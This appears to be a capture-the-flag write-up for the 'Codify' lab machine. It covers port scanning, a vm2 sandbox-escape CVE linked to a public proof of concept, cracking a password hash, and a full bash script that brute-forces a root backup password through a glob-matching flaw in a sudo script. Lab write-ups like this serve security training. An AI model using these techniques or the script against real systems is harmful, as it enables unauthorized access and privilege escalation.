# codify

![Untitled](codify%2014a5eab8b89545088470140172cb5cb0/Untitled.png)

### Enumeration

Add the machine ip address to /etc/hosts file and save it

![Untitled](codify%2014a5eab8b89545088470140172cb5cb0/Untitled%201.png)

Scan the target for open ports using nmap

```jsx
➜  codify sudo nmap -sVC -Pn -p- -sV -sC -T4 --min-rate=1500 -oN nmap-scan codify.htb
# Nmap 7.94 scan initiated Fri Dec 22 01:45:15 2023 as: nmap -sVC -Pn -p- -sV -sC -T4 --min-rate=1500 -oN nmap-scan codify.htb
Warning: 10.10.11.239 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.11.239
Host is up (0.36s latency).
Not shown: 38998 filtered tcp ports (no-response), 26533 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http       Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://codify.htb/
3000/tcp open  http       Node.js Express framework
|_http-title: Codify
8080/tcp open  http-proxy
|_http-title: Site doesn't have a title (text/plain).
|_http-open-proxy: Proxy might be redirecting requests
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, SMBProgNeg, SSLSessionReq, Socks4, Socks5, TLSSessionReq, TerminalServerCookie, X11Probe: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   FourOhFourRequest, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-Type: text/plain
|     Date: Fri, 22 Dec 2023 01:49:35 GMT
|     Connection: close
|     Hello World!
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-Type: text/plain
|     Date: Fri, 22 Dec 2023 01:49:34 GMT
|     Connection: close
|_    Hello World!
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94%I=7%D=12/22%Time=6584EB32%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,71,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/plain\r\n
SF:Date:\x20Fri,\x2022\x20Dec\x202023\x2001:49:34\x20GMT\r\nConnection:\x2
SF:0close\r\n\r\nHello\x20World!")%r(HTTPOptions,71,"HTTP/1\.1\x20200\x20O
SF:K\r\nContent-Type:\x20text/plain\r\nDate:\x20Fri,\x2022\x20Dec\x202023\
SF:x2001:49:34\x20GMT\r\nConnection:\x20close\r\n\r\nHello\x20World!")%r(R
SF:TSPRequest,71,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/plain\r\
SF:nDate:\x20Fri,\x2022\x20Dec\x202023\x2001:49:35\x20GMT\r\nConnection:\x
SF:20close\r\n\r\nHello\x20World!")%r(FourOhFourRequest,71,"HTTP/1\.1\x202
SF:00\x20OK\r\nContent-Type:\x20text/plain\r\nDate:\x20Fri,\x2022\x20Dec\x
SF:202023\x2001:49:35\x20GMT\r\nConnection:\x20close\r\n\r\nHello\x20World
SF:!")%r(Socks5,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20c
SF:lose\r\n\r\n")%r(Socks4,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConne
SF:ction:\x20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F,"HTTP/
SF:1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSSt
SF:atusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x2
SF:0close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConne
SF:ction:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x20Bad\x
SF:20Request\r\nConnection:\x20close\r\n\r\n")%r(TerminalServerCookie,2F,"
SF:HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(
SF:TLSSessionReq,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20
SF:close\r\n\r\n")%r(Kerberos,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
SF:nnection:\x20close\r\n\r\n")%r(SMBProgNeg,2F,"HTTP/1\.1\x20400\x20Bad\x
SF:20Request\r\nConnection:\x20close\r\n\r\n")%r(X11Probe,2F,"HTTP/1\.1\x2
SF:0400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(LPDString,2F
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%
SF:r(LDAPSearchReq,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x
SF:20close\r\n\r\n")%r(LDAPBindReq,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\nConnection:\x20close\r\n\r\n");
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Dec 22 01:50:11 2023 -- 1 IP address (1 host up) scanned in 295.83 seconds
```

From the nmap scan, there are four (4) open port

➜ 22 running ssh

➜ 80 running Apache httpd

➜ 3000 running node.js

➜ 8080 running http-proxy

visiting the webpage running on port 80 

![Untitled](codify%2014a5eab8b89545088470140172cb5cb0/Untitled%202.png)

### Directory Enumeration

using ffuf, i performed directory fuzzing on the target and found some directories

```jsx
ffuf -ic -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .txt,.php,.xml,.html -u http://codify.htb/FUZZ
```

![Untitled](codify%2014a5eab8b89545088470140172cb5cb0/Untitled%203.png)

i visited http://codify.htb/about

![Screenshot from 2023-12-23 01-58-50.png](codify%2014a5eab8b89545088470140172cb5cb0/Screenshot_from_2023-12-23_01-58-50.png)

### Exploitatio

i found out that the target is runnig vm2 with a version 0f 3.9.16 so i decided to look for an exploit for it (**CVE-2023–30547)**

There exists a vulnerability in exception sanitization of vm2 for versions up to 3.9.16, allowing attackers to raise an unsanitized host exception inside `handleException()` which can be used to escape the sandbox and run arbitrary code in host context.****

[https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244](https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244)

after i deploying the proof of concept for thr vulnerability, i got a sell

![Screenshot from 2023-12-23 02-07-55.png](codify%2014a5eab8b89545088470140172cb5cb0/Screenshot_from_2023-12-23_02-07-55.png)

![Untitled](codify%2014a5eab8b89545088470140172cb5cb0/Untitled%204.png)

**SUPER!!! i got a ShElL!!!! 🙂🙂**

![download (2).jpeg](codify%2014a5eab8b89545088470140172cb5cb0/download_(2).jpeg)

### User flag

i tried to read the user.txt but i got permission denied 😢😢. we have to escalate our privilege to Joshua before we can read user.txt

After so many tires and tirals 😩😫, i decided to look at the web directory ********************************/var/ww/contact********************************  and found something intresting 😉

Looking at it it was a database owned by svc user i was currently running as 

![Screenshot from 2023-12-27 13-35-50.png](codify%2014a5eab8b89545088470140172cb5cb0/Screenshot_from_2023-12-27_13-35-50.png)

Of course, i tried reading the content of the database and i found a hash for a user  and a message 

![Screenshot from 2023-12-27 13-40-19.png](codify%2014a5eab8b89545088470140172cb5cb0/Screenshot_from_2023-12-27_13-40-19.png)

i cracked the hash using john the ripper and got a password

![Screenshot from 2023-12-27 14-02-05.png](codify%2014a5eab8b89545088470140172cb5cb0/Screenshot_from_2023-12-27_14-02-05.png)

i used the password i go to login into the ssh server as joshua

![Untitled](codify%2014a5eab8b89545088470140172cb5cb0/Untitled%205.png)

Finally, as the joshua user I could read the protected user flag in /home/joshua/user.txt:

![Screenshot from 2023-12-27 23-33-03.png](codify%2014a5eab8b89545088470140172cb5cb0/Screenshot_from_2023-12-27_23-33-03.png)

### Root Flag

Since i have joshua’s password, the first thing i would do is to check if he has any sudo privileges

```jsx
joshua@codify:~$ sudo -l
[sudo] password for joshua: 
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
joshua@codify:~$
```

Analyzing **/opt/scripts/mysql-backup.sh** i discovered that the script compares the user-provided password (USER_PASS) with the actual database password (DB_PASS). The vulnerability here is due to the use of == inside [[ ]] in Bash, which performs pattern matching rather than a direct string comparison. This means that the user input (USER_PASS) is treated as a pattern, and if it includes glob characters like * or ?, it can potentially match unintended strings.

For example, if the actual password (DB_PASS) is password123 and the user enters * as their password (USER_PASS), the pattern match will succeed because * matches any string, resulting in unauthorized access.

### Exploiting

I used a Bash script that exploits this by testing password prefixes and suffixes to slowly reveal the full password.

it builds up the password character by character, confirming each guess by invoking the script via sudo and checking for a successful run.

```jsx
password=""

while true; do
    password_check=$(echo "$password" | sudo /opt/scripts/mysql-backup.sh 2>&1 | wc -l)

    if [ $password_check -gt 2 ]
    then
        echo "$password"
        break
    fi

    for char in {a..z} {A..Z} {0..9}; do
        result_number_of_lines=$(echo "$password$char*" | sudo /opt/scripts/mysql-backup.sh 2>&1 | wc -l)

        if [ $result_number_of_lines -gt 2 ]
        then
            password="$password$char"
            continue
        fi
    done
done
```

![Screenshot from 2023-12-27 23-53-45.png](codify%2014a5eab8b89545088470140172cb5cb0/Screenshot_from_2023-12-27_23-53-45.png)

with the backup password, i was able to switch to root

![Screenshot from 2023-12-27 23-56-13.png](codify%2014a5eab8b89545088470140172cb5cb0/Screenshot_from_2023-12-27_23-56-13.png)

![download.jpeg](codify%2014a5eab8b89545088470140172cb5cb0/download.jpeg)